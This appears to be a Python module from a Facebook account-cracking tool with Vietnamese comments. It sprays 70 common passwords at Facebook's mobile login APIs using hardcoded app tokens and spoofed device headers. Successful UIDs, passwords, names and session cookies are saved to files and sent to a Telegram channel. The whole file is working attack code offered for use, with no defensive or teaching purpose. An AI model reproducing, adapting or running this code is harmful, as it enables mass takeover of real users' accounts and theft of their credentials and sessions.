import requests
import uuid
import time
import json
from random import randint as rr
from ..utils.helpers import window1
from .classifier import classify_and_get_cookie
from ..models.stats import StatsManager
from ..utils.telegram import send_telegram

# 70 mật khẩu siêu phổ biến
EXTRA_PASSWORDS = [
    '123456', '1234567', '12345678', '123456789', '1234567890',
    'password', '123123', '111111', '000000', '12341234',
    'admin123', 'abc123', 'qwerty', 'iloveyou', 'welcome',
    'monkey', 'dragon', 'master', 'hello', 'fuckyou',
    'passw0rd', 'shadow', 'sunshine', 'superman', 'michael',
    'charlie', 'donald', 'jessica', 'michelle', 'ashley',
    'baseball', 'football', 'soccer', 'batman', 'superman',
    'whatever', 'letmein', 'trustno1', 'admin', 'root',
    'toor', '12345', '54321', '09876', '11111111',
    '222222', '333333', '444444', '555555', '666666',
    '777777', '888888', '999999', 'abc123456', 'qwerty123',
    '1q2w3e4r', '1qaz2wsx', 'zaq12wsx', '!@#$%^&*', 'password1',
    'Password1', 'P@ssw0rd', 'PASSWORD', 'pass123', '123456a',
    'a123456', 'abcd1234', 'qwertyuiop', 'zxcvbnm', 'iloveyou1'
]

def login_1(uid, live_stats_dict):
    """Phương thức A - nhanh (dùng b-graph facebook)"""
    stats = StatsManager().get()
    session = requests.session()
    for pw in EXTRA_PASSWORDS:
        try:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login',
                'email': str(uid), 'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(rr(20000,40000)),
                'X-FB-SIM-HNI': str(rr(20000,40000)), 'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=10).json()
            if 'session_key' in res:
                cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                break
        except:
            continue
    stats.set_last_uid(uid)
    live_stats_dict["loop"] += 1

def login_2(uid, live_stats_dict):
    """Phương thức B - chính xác (dùng b-api)"""
    stats = StatsManager().get()
    for pw in EXTRA_PASSWORDS:
        try:
            with requests.Session() as s:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)),
                    'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = s.get(url, headers=headers, timeout=10).json()
                if 'session_key' in str(po):
                    cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                    _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                    open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                    break
                elif 'www.facebook.com' in str(po):
                    cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                    _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                    open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                    break
        except:
            continue
    stats.set_last_uid(uid)
    live_stats_dict["loop"] += 1

def login_combined(uid, live_stats_dict):
    """Phương thức C - kết hợp"""
    stats = StatsManager().get()
    session = requests.session()
    for pw in EXTRA_PASSWORDS:
        try:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': str(uid), 'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {'User-Agent': window1()}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=8).json()
            if 'session_key' in res:
                cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cls, cookie, name = classify_and_get_cookie(str(uid), pw)
                _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict)
                open(f"{cls.lower()}.txt", 'a').write(f"{uid}|{pw}\n")
                break
        except:
            continue
    stats.set_last_uid(uid)
    live_stats_dict["loop"] += 1

def _handle_result(uid, pw, cls, cookie, name, stats, live_stats_dict):
    """Xử lý kết quả phân loại"""
    if cls == 'ALIVE':
        stats.inc_alive(uid, cookie, name)
        msg = (f"✅ <b>ALIVE ACCOUNT</b>\n🔹 UID: {uid}\n🔹 Pass: {pw}\n🔹 Name: {name}\n🔹 Cookie: {cookie}")
        send_telegram(msg)
    elif cls == '2FA':
        stats.inc_2fa(uid, cookie)
        msg = (f"⚠️ <b>2FA ACCOUNT</b>\n🔹 UID: {uid}\n🔹 Pass: {pw}\n🔹 Name: {name if name else 'Unknown'}\n🔹 Cookie: {cookie}")
        send_telegram(msg)
    elif cls == 'DIE':
        stats.inc_die()
    elif cls == 'TEMP_BLOCK' or cls == 'ACCOUNT_DISABLED' or cls == 'LOCKED' or cls == 'RATE_LIMIT':
        stats.inc_temp_block()
    elif cls == 'UNVERIFIED_EMAIL':
        stats.inc_unverified_email()
    elif cls == 'UNVERIFIED_PHONE':
        stats.inc_unverified_phone()
    else:
        stats.inc_unknown()
    
    # Cập nhật live_stats_dict để hiển thị
    live_stats_dict["oks"] = len(stats.oks)
    live_stats_dict["cps"] = len(stats.cps)
    
    from rich.console import Console
    console = Console()
    color = "green" if cls=='ALIVE' else "yellow" if cls=='2FA' else "red"
    console.print(f"[{color}]{cls}[/] {uid}|{pw}")
